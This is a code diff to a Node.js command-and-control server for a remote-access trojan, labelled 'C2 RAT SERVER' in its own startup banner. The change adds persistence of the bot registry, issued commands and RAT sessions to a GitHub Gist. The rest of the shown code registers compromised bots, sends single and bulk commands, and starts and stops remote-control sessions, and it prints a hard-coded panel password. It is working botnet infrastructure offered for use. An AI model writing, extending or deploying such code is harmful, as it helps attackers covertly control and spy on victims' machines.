@@ -6,6 +6,9 @@ const bodyParser = require('body-parser');
 const path = require('path');
 const crypto = require('crypto');
 
+// --- GITHUB GIST ---
+const { Octokit } = require('@octokit/rest');
+
 // --- INIT ---
 const app = express();
 const server = http.createServer(app);
@@ -16,7 +19,29 @@ app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
 // ============================================================
-//  DATABASE - MEMORY ONLY
+//  GITHUB GIST CONFIG
+// ============================================================
+const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
+const GIST_ID = process.env.GIST_ID || '';
+const GIST_FILENAME = 'c2_db.json';
+
+let octokit = null;
+let gistEnabled = false;
+
+if (GITHUB_TOKEN && GIST_ID) {
+    try {
+        octokit = new Octokit({ auth: GITHUB_TOKEN });
+        gistEnabled = true;
+        console.log('✅ GitHub Gist enabled');
+    } catch (e) {
+        console.log('❌ GitHub Gist init failed:', e.message);
+    }
+} else {
+    console.log('⚠️ GitHub Gist not configured (set GITHUB_TOKEN & GIST_ID)');
+}
+
+// ============================================================
+//  DATABASE - MEMORY
 // ============================================================
 const DB = {
     bots: [],
@@ -26,8 +51,73 @@ const DB = {
     admin_logs: []
 };
 
-// Stream cache for RAT
+// Stream cache
 const streamCache = new Map();
+
+// ============================================================
+//  GITHUB GIST FUNCTIONS
+// ============================================================
+
+// Load from Gist
+async function loadFromGist() {
+    if (!gistEnabled) return false;
+    try {
+        const response = await octokit.gists.get({ gist_id: GIST_ID });
+        const files = response.data.files;
+        if (files && files[GIST_FILENAME]) {
+            const content = files[GIST_FILENAME].content;
+            const data = JSON.parse(content);
+            DB.bots = data.bots || [];
+            DB.commands = data.commands || [];
+            DB.pending_commands = data.pending_commands || [];
+            DB.rat_sessions = data.rat_sessions || [];
+            DB.admin_logs = data.admin_logs || [];
+            console.log('✅ Loaded database from GitHub Gist');
+            return true;
+        }
+        return false;
+    } catch (error) {
+        console.log('⚠️ Failed to load from Gist:', error.message);
+        return false;
+    }
+}
+
+// Save to Gist
+async function saveToGist() {
+    if (!gistEnabled) return false;
+    try {
+        const content = JSON.stringify({
+            bots: DB.bots,
+            commands: DB.commands,
+            pending_commands: DB.pending_commands,
+            rat_sessions: DB.rat_sessions,
+            admin_logs: DB.admin_logs
+        }, null, 2);
+        
+        await octokit.gists.update({
+            gist_id: GIST_ID,
+            files: {
+                [GIST_FILENAME]: { content: content }
+            }
+        });
+        console.log('✅ Synced to GitHub Gist');
+        return true;
+    } catch (error) {
+        console.log('❌ Failed to sync to Gist:', error.message);
+        return false;
+    }
+}
+
+// ============================================================
+//  DATABASE WRAPPER - AUTO SYNC
+// ============================================================
+
+async function saveDB() {
+    // Sync to Gist (bất đồng bộ, không chờ)
+    if (gistEnabled) {
+        saveToGist().catch(() => {});
+    }
+}
 
 // ============================================================
 //  AUTH
@@ -77,6 +167,7 @@ wss.on('connection', (ws, req) => {
                 } else {
                     DB.bots.push(bot);
                 }
+                await saveDB();
 
                 // Gửi pending commands
                 const pendings = DB.pending_commands.filter(p => p.bot_id === botId);
@@ -84,6 +175,7 @@ wss.on('connection', (ws, req) => {
                     sendCommand(ws, botId, p.cmd_id, p.command, JSON.parse(p.args || '[]'));
                 });
                 DB.pending_commands = DB.pending_commands.filter(p => p.bot_id !== botId);
+                await saveDB();
 
                 console.log(`[BOT] ✅ Registered: ${botId}`);
                 ws.send(JSON.stringify({ type: 'registered', bot_id: botId }));
@@ -107,6 +199,7 @@ wss.on('connection', (ws, req) => {
                     DB.commands[cmdIndex].result = data.result;
                     DB.commands[cmdIndex].status = data.status || 'ok';
                     DB.commands[cmdIndex].executed_at = Date.now();
+                    await saveDB();
                 } else {
                     DB.commands.push({
                         bot_id: botId,
@@ -118,6 +211,7 @@ wss.on('connection', (ws, req) => {
                         issued_at: Date.now(),
                         executed_at: Date.now()
                     });
+                    await saveDB();
                 }
             }
 
@@ -141,13 +235,14 @@ wss.on('connection', (ws, req) => {
         }
     });
 
-    ws.on('close', () => {
+    ws.on('close', async () => {
         for (let [id, client] of botClients.entries()) {
             if (client === ws) {
                 botClients.delete(id);
                 const bot = DB.bots.find(b => b.bot_id === id);
                 if (bot) {
                     bot.online = 0;
+                    await saveDB();
                 }
                 console.log(`[BOT] ❌ Disconnected: ${id}`);
                 break;
@@ -182,14 +277,15 @@ app.get('/api/bots/online', auth, (req, res) => {
     res.json(DB.bots.filter(b => b.online === 1));
 });
 
-app.delete('/api/bots/:bot_id', auth, (req, res) => {
+app.delete('/api/bots/:bot_id', auth, async (req, res) => {
     DB.bots = DB.bots.filter(b => b.bot_id !== req.params.bot_id);
     DB.commands = DB.commands.filter(c => c.bot_id !== req.params.bot_id);
     DB.pending_commands = DB.pending_commands.filter(p => p.bot_id !== req.params.bot_id);
+    await saveDB();
     res.json({ status: 'deleted' });
 });
 
-app.post('/api/command', auth, (req, res) => {
+app.post('/api/command', auth, async (req, res) => {
     const { bot_id, command, args = [] } = req.body;
     if (!bot_id || !command) {
         return res.status(400).json({ error: 'Missing bot_id or command' });
@@ -207,6 +303,7 @@ app.post('/api/command', auth, (req, res) => {
         issued_at: Date.now(),
         executed_at: null
     });
+    await saveDB();
 
     const ws = botClients.get(bot_id);
     if (ws && ws.readyState === WebSocket.OPEN) {
@@ -220,18 +317,19 @@ app.post('/api/command', auth, (req, res) => {
             args: JSON.stringify(args),
             issued_at: Date.now()
         });
+        await saveDB();
         res.json({ status: 'queued', cmd_id: cmdId });
     }
 });
 
-app.post('/api/command/bulk', auth, (req, res) => {
+app.post('/api/command/bulk', auth, async (req, res) => {
     const { bot_ids, command, args = [] } = req.body;
     if (!bot_ids || !Array.isArray(bot_ids) || bot_ids.length === 0) {
         return res.status(400).json({ error: 'Missing bot_ids array' });
     }
 
     const results = [];
-    bot_ids.forEach(botId => {
+    for (const botId of bot_ids) {
         const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
         DB.commands.push({
             bot_id: botId,
@@ -258,8 +356,8 @@ app.post('/api/command/bulk', auth, (req, res) => {
             });
             results.push({ bot_id: botId, status: 'queued', cmd_id: cmdId });
         }
-    });
-
+    }
+    await saveDB();
     res.json({ results });
 });
 
@@ -322,13 +420,14 @@ app.post('/api/rat/start', auth, (req, res) => {
         socket_id: 'ws-' + Date.now(),
         session_start: Date.now()
     });
+    saveDB();
 
     const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
     sendCommand(ws, bot_id, cmdId, 'rat_start', []);
     res.json({ status: 'rat_started', bot_id });
 });
 
-app.post('/api/rat/stop', auth, (req, res) => {
+app.post('/api/rat/stop', auth, async (req, res) => {
     const { bot_id } = req.body;
     if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });
 
@@ -339,6 +438,7 @@ app.post('/api/rat/stop', auth, (req, res) => {
     }
     DB.rat_sessions = DB.rat_sessions.filter(r => r.bot_id !== bot_id);
     streamCache.delete(bot_id);
+    await saveDB();
     res.json({ status: 'rat_stopped', bot_id });
 });
 
@@ -396,14 +496,35 @@ app.get('/api/db/bots', auth, (req, res) => res.json(DB.bots));
 app.get('/api/db/commands', auth, (req, res) => res.json(DB.commands));
 app.get('/api/db/pending', auth, (req, res) => res.json(DB.pending_commands));
 
-app.delete('/api/db', auth, (req, res) => {
+app.delete('/api/db', auth, async (req, res) => {
     DB.bots = [];
     DB.commands = [];
     DB.pending_commands = [];
     DB.rat_sessions = [];
     DB.admin_logs = [];
     streamCache.clear();
+    await saveDB();
     res.json({ status: 'cleared' });
+});
+
+// ============================================================
+//  GIST STATUS API
+// ============================================================
+
+app.get('/api/gist/status', auth, (req, res) => {
+    res.json({
+        enabled: gistEnabled,
+        gist_id: GIST_ID || null,
+        has_token: !!GITHUB_TOKEN
+    });
+});
+
+app.post('/api/gist/sync', auth, async (req, res) => {
+    if (!gistEnabled) {
+        return res.json({ status: 'error', message: 'Gist not configured' });
+    }
+    const result = await saveToGist();
+    res.json({ status: result ? 'ok' : 'error', message: result ? 'Synced' : 'Sync failed' });
 });
 
 // ============================================================
@@ -427,13 +548,26 @@ app.get('/style.css', (req, res) => {
 // ============================================================
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => {
-    console.log('='.repeat(50));
-    console.log('  ✅ C2 RAT SERVER STARTED');
-    console.log(`  Port: ${PORT}`);
-    console.log(`  Dashboard: http://localhost:${PORT}/`);
-    console.log(`  RAT Control: http://localhost:${PORT}/rat`);
-    console.log(`  Password: H3XTEK0`);
-    console.log(`  Mode: Memory Database`);
-    console.log('='.repeat(50));
-});
+
+async function startServer() {
+    // Load từ Gist nếu có
+    if (gistEnabled) {
+        await loadFromGist();
+    }
+    
+    server.listen(PORT, '0.0.0.0', () => {
+        console.log('='.repeat(50));
+        console.log('  ✅ C2 RAT SERVER STARTED');
+        console.log(`  Port: ${PORT}`);
+        console.log(`  Dashboard: http://localhost:${PORT}/`);
+        console.log(`  RAT Control: http://localhost:${PORT}/rat`);
+        console.log(`  Password: H3XTEK0`);
+        console.log(`  Gist: ${gistEnabled ? '✅ Enabled' : '❌ Disabled'}`);
+        if (gistEnabled) {
+            console.log(`  Gist ID: ${GIST_ID}`);
+        }
+        console.log('='.repeat(50));
+    });
+}
+
+startServer();
